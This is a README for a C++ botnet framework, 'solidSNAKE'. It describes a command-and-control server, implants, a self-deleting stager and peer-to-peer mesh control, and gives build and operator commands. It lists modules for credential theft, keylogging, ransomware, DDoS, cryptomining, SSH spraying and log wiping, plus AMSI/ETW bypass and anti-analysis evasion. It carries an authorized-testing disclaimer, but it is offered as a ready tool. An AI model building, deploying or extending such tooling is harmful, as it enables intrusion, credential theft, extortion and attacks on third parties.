# nightmare xo
# solidSNAKE

A C++ rewrite of the ROGUE botnet framework, featuring an integrated command-and-control (C2) server, mesh networking, and a modular payload system. Built for authorized security testing, red team operations, and defensive research.

> **Disclaimer:** This project is provided for authorized security testing and educational purposes only. Do not use it on systems you do not own or have explicit permission to test.

---

## Overview

solidSNAKE is a complete C++ reimplementation of the ROGUE botnet. It provides:

- **C2 Server** — TLS-enabled command-and-control server with an operator dashboard, REST API, and WebSocket implant channel.
- **Implant** — Cross-platform agent (Windows / Linux) with multiple communication channels (WebSocket, REST, DNS tunnel) and a modular payload system.
- **Stager** — Minimal first-stage binary that fetches and deploys the implant.
- **Mesh Networking** — Peer-to-peer C2 mesh for distributed operations.

The codebase is structured around a portable core (`snake/` headers + `src/` implementations) with platform-specific shims in `compat/` for Windows builds.

---

## Features

### C2 Server
- **TLS by default** with self-signed certificate generation (Ed25519).
- **Operator dashboard** — embedded HTML UI served at `/dashboard` with login, implant listing, task queuing, and shell interaction.
- **REST API** — JSON endpoints for implants, tasks, peers, payloads, and exfiltration data.
- **WebSocket implant channel** — binary-framed AEAD-encrypted beacon/task/result exchange.
- **DNS tunnel fallback** — exfiltration over DNS queries.
- **SQLite persistence** — implant records, tasks, mesh nodes, and exfil data stored in a local database.
- **Mesh networking** — P2P heartbeat exchange over TLS with Ed25519 signatures.

### Implant
- **Multi-channel C2** — WebSocket → REST → DNS tunnel (automatic fallback).
- **Payload registry** — 24+ built-in modules (recon, credential harvesting, persistence, evasion, impact).
- **Sleep mask** — Sensitive state (session key, config, in-flight buffer) locked and encrypted during beacon sleep.
- **Anti-analysis gate** — Opt-in scored heuristic gate (uptime, disk, RAM, CPU, hypervisor OUI, analysis tools).
- **Kill date / deadman switch** — Self-destruct after a deadline or maximum runtime.
- **Work schedule** — Restrict beaconing to specific hours/days (local time).
- **Malleable traffic profile** — Customize User-Agent, headers, paths, and cover traffic.
- **AMSI/ETW neutralization** — Windows-only, opt-in in-memory patching.

### Stager
- **Anti-analysis delay** — Random 5–15 second sleep before execution.
- **Environment check** — Uptime and CPU count probes.
- **Stage-2 fetch** — Downloads the implant from the C2 REST endpoint.
- **Temp-drop and execute** — Drops the implant into a private temp directory and spawns it.
- **Self-destruct** — Removes the stager binary after deployment.

---

## Build

### Prerequisites

- **C++ compiler** 
- **libsodium** (for crypto)
- **OpenSSL** (for TLS)
- **NASM** (for Windows x64 assembly, optional)

### Native Build (Linux)

```bash
# Install dependencies (Debian/Ubuntu)
sudo apt install build-essential libsodium-dev libssl-dev

# Build all binaries
make

# Build specific targets
make build/solidsnake          # Implant
make build/solidsnake-c2       # C2 server
make build/solidsnake-stager   # Stager
make build/solidsnake-payloads # Payload runner
```

### Cross-Compilation

```bash
# Windows (mingw-w64)
sudo apt install g++-mingw-w64-x86-64
make cross-windows-amd64

# Linux ARM64
sudo apt install g++-aarch64-linux-gnu
make cross-linux-arm64

# Full matrix
./scripts/crossbuild.sh
```

---

## Usage

### C2 Server

```bash
# Generate self-signed certificates and start the server
./build/solidsnake-c2 \
    --listen ":4443" \
    --gen-certs \
    --password "operator-secret" \
    --db "data/c2.db"

# The server prints a session key on startup — provision it to implants.
```

### Implant

```bash
./build/solidsnake \
    --c2 "wss://127.0.0.1:4443/ws" \
    --key <session-key-hex> \
    --insecure \
    --debug
```

### Payload Runner

```bash
# List available payloads
./build/solidsnake-payloads --list

# Execute a payload
./build/solidsnake-payloads sysrecon
./build/solidsnake-payloads polyloader --shellcode "QUJD" --key "aa"
```

### Stager

```bash
./build/solidsnake-stager \
    --c2 "https://127.0.0.1:4443" \
    --payload "implant" \
    --key <session-key-hex>
```

---

## Testing

```bash
# Unit tests + conformance checks
make test

# end-to-end (C2 + implant only)
./scripts/e2e_cpp.sh

# oracle end-to-end 
./scripts/e2e_local.sh

# interop (crypto, protocol, DNS, CLI, store, API, mesh)
./scripts/interop.sh

# Windows stealth compile/import check
./scripts/winstealth_check.sh
```

---

## Payload Modules

| Category | Modules |
|----------|---------|
| **Recon** | `sysrecon`, `cloud_detector`, `linpeas_light` |
| **Credential** | `aws_cred_stealer`, `azure_cred_harvester`, `browserstealer`, `hashdump`, `k8s_secret_stealer` |
| **Collection** | `keylogger`, `screenshot` |
| **Persistence** | `persist_cron`, `process_inject` |
| **Evasion** | `polyloader`, `filehider`, `logcleaner` |
| **Lateral** | `sshspray`, `autodeploy`, `container_escape` |
| **Impact** | `fileransom`, `ddos`, `mine`, `competitor_cleaner` |
| **Exfiltration** | `dnstunnel` |

---

## Security & Evasion

- **Literal obfuscation** — Sensitive strings (`SNAKE_OBF`) stored XORed at compile time.
- **Dynamic API resolution (Windows)** — Sensitive call set resolved via PEB walk and export parsing; no static IAT imports.
- **Indirect syscalls (Windows)** — Syscall-class NT functions executed from a `syscall; ret` gadget inside ntdll.
- **Sleep mask** — Session key and config encrypted during beacon sleep; pages locked (`mlock`/`VirtualLock`).
- **Traffic shaping** — Malleable profile allows custom User-Agent, headers, paths, and cover traffic.
- **AMSI/ETW bypass** — Opt-in patching of `AmsiScanBuffer` and `EtwEventWrite` (Windows only).

---

> **Warning:** This tool is intended for authorized security testing only.
